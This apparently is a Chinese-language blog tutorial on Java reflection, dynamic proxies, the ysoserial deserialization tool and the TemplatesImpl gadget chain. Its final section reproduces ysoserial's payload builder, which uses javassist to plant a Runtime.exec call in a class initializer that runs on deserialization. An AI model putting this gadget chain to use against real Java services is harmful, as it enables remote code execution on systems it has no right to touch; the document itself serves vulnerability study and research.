<p>JAVA IDL是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于CORBA，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html">文档</a>。</p>
<h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制</p>
<p><strong>获取class</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> testClass.getClass();</span><br><span class="line"><span class="comment">// class属性,最安全,性能最好,不会自动初始化该Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> testClass.class;</span><br><span class="line"><span class="comment">// 动态加载,最常用,className需要是类的全限定名,会自动初始化该Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;&#123;package.className&#125;&quot;</span>);</span><br><span class="line"><span class="comment">// 动态加载</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class4</span> <span class="operator">=</span> ClassLoader.loadClass(<span class="string">&quot;&#123;package.className&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code></p>
</blockquote>
<p><strong>获取constructor</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getDeclaredConstructor会返回所有有权限的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> class1.getDeclaredConstructor(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructors1</span> <span class="operator">=</span> class1.getDeclaredConstructors(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="comment">// getConstructor只返回权限是public的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> class1.getConstructor(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructors2</span> <span class="operator">=</span> class1.getConstructors(&#123;arg1&#125;.class, ...);</span><br></pre></td></tr></table></figure>

<p><strong>创建instance</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用构造器进行实例化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance1</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line"><span class="comment">// 当构造函数无参时,可直接使用class进行实例化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance1</span> <span class="operator">=</span> class1.newInstance();</span><br></pre></td></tr></table></figure>

<p><strong>获取method</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// getDeclaredMethod会返回到当前类的所有成员方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> class1.getDeclaredMethod(<span class="string">&quot;&#123;methodName&#125;&quot;</span>, &#123;arg1&#125;.class, ...);</span><br><span class="line">Method[] methods1 = class1.getDeclaredMethods();</span><br><span class="line"><span class="comment">// getMethod只返回当前类和父类的权限是public的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> class1.getMethod(<span class="string">&quot;&#123;methodName&#125;&quot;</span>, &#123;arg1&#125;.class, ...);</span><br><span class="line">Method[] methods2 = class1.getMethods();</span><br></pre></td></tr></table></figure>

<p><strong>调用method</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process1</span> <span class="operator">=</span> (Process) method1.invoke(instance1,<span class="string">&quot;&#123;arg0&#125;&quot;</span>); <span class="comment">// arg0是调用函数的参数,可选选项</span></span><br></pre></td></tr></table></figure>

<p><strong>获取method结果</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process1.getInputStream();</span><br></pre></td></tr></table></figure>

<p><strong>输出method结果</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(IOUtils.toString(in,<span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><strong>设置public属性</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">method1.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>



<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>Java动态机制涉及一个接口和一个类，分别是<code>InvocationHandler</code>接口和<code>Proxy</code>类</p>
<p><strong>InvocationHandler</strong></p>
<p><code>InvocationHandler</code>接口是<code>proxy</code>代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序，在代理实例调用方法时，方法调用被编码并调度到调用处理程序的<code>invoke</code>方法</p>
<p><strong>Proxy</strong></p>
<p><code>Proxy</code>类就是用来创建一个代理对象的类，它提供了很多方法，但是我们最常用的是<code>newProxyInstance</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(</span></span><br><span class="line"><span class="params">    ClassLoader loader,  // 代理类的classloader</span></span><br><span class="line"><span class="params">	Class&lt;?&gt;[] interfaces,  // 代理类的interface数组</span></span><br><span class="line"><span class="params">	InvocationHandler h // 包含invoke函数实现的InvocationHandler</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p><strong>样例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
</blockquote>
<p>ysoerial是一款专门用于生成Java反序列化Payload的工具</p>
<p>我们可以在<code>src/main/java/ysoserial/payloads/</code>文件夹中自定义自己的Payload，不过在自定义之前我们需要了解<code>src/main/java/ysoserial/payloads/util</code>文件中工具类的使用</p>
<p><strong>ClassFiles.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将类转化为文件名</span></span><br><span class="line">String <span class="title function_">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="type">boolean</span> suffix)</span></span><br><span class="line"><span class="comment">// 将类转化为字节码</span></span><br><span class="line"><span class="type">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span><br></pre></td></tr></table></figure>

<p><strong>Gadgets.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个memberValues为map的AnnotationInvocationHandler接口</span></span><br><span class="line">InvocationHandler <span class="title function_">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span></span><br><span class="line"><span class="comment">// 创建iface类对应的Proxy实例</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span></span><br><span class="line"><span class="comment">// 创建实现了AnnotationInvocationHandler接口的iface类对应的Proxy实例</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span></span><br><span class="line"><span class="comment">// 创建一个HashMap实例并加入&#123;key:val&#125;元素</span></span><br><span class="line">Map&lt;String, Object&gt; <span class="title function_">createMap</span> <span class="params">( <span class="keyword">final</span> String key, <span class="keyword">final</span> Object val )</span></span><br><span class="line"><span class="comment">// 使用TemplatesImpl的Gadget构造执行command的对象</span></span><br><span class="line">Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span></span><br><span class="line"><span class="comment">// 创建一个table成员为[&#123;v1:v1&#125;,&#123;v2:v2&#125;]的HashMap实例</span></span><br><span class="line">HashMap <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span></span><br></pre></td></tr></table></figure>

<p><strong>JavaVersion.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取本地Java版本</span></span><br><span class="line">JavaVersion <span class="title function_">getLocalVersion</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p><strong>PayloadRunner.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 运行Payload</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span></span><br></pre></td></tr></table></figure>

<p><strong>Reflections.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取对象成员</span></span><br><span class="line">Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span></span><br><span class="line"><span class="comment">// 设置对象成员</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line"><span class="comment">// 获取对象成员的值</span></span><br><span class="line">Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span></span><br><span class="line"><span class="comment">// 获取第一个构造器</span></span><br><span class="line">Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line"><span class="comment">// 使用构造器进行实例化</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br></pre></td></tr></table></figure>



<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><blockquote>
<p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a></p>
</blockquote>
<p>在上面<code>Gadgets.java</code>中的<code>createTemplatesImpl()</code>函数中，我们提到了ysoserial是使用<code>TemplatesImpl</code>的Gadget来构造恶意数据的，下面我们详细介绍一下其原理</p>
<h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有Class中动态修改和插入Java static代码</p>
<p><strong>样例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">  <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(Cat.class.getName());</span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>;</span><br><span class="line">  <span class="comment">// 创建static代码块，并插入代码</span></span><br><span class="line">  cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">  <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">  cc.setName(randomClassName);</span><br><span class="line">  <span class="comment">// 写入.class 文件</span></span><br><span class="line">  cc.writeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里有一个重要的知识点是<code>defineClass()</code>函数并不会触发上面的static代码，但是使用<code>newInstence()</code>函数进行实例化的时候可以触发</p>
</blockquote>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>首先我们找到<code>TemplatesImpl</code>类的入口点<code>getOutputProperties()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties(); <span class="comment">// 1 跟进newTransformer()函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory); <span class="comment">// 2 实例化了TransformerImpl,跟进getTransletInstance()函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 3 令_name为非空往下进行</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses(); <span class="comment">// 4 令_class为空,跟进defineTransletClasses()函数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                _class[_transletIndex].getConstructor().newInstance(); <span class="comment">// 8 使用newInstance()触发static代码,至此代码利用完成</span></span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">            NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); <span class="comment">// 5 确保_tfactory成员具有getExternalExtensionsMap()函数,即需是一个TransformerFactoryImpl类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// 6 使用了loader.defineClass()加载类字节码,但是还缺少static代码的触发条件</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; <span class="comment">// 7 令superClass为ABSTRACT_TRANSLET,即父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet,使_transletIndex更新</span></span><br><span class="line">                _transletIndex = i; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>我们看一下最终的payload实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5971610431559700674L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span> <span class="params">( DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Foo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8207363842866235160L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="comment">// 引入了三个必要类</span></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将cmd写入到StubTransletPayload类的静态代码中</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// 为重复利用采用随机命名</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="comment">// 传入父类类型,对应调用链第7个地方,但是_transletIndex默认为0,如果我们把payload直接放在第1位是不会有影响的</span></span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 传入payload的字节码,至于这里为什么要引入一个Foo类我也不太清楚,去掉是不会有影响的</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对应调用链第3个地方</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    <span class="comment">// 对应调用链第5个地方,但是其实_tfactory是被transient修饰的,是不参与反序列化的,它在readObject是会进行重构的,删除无影响</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



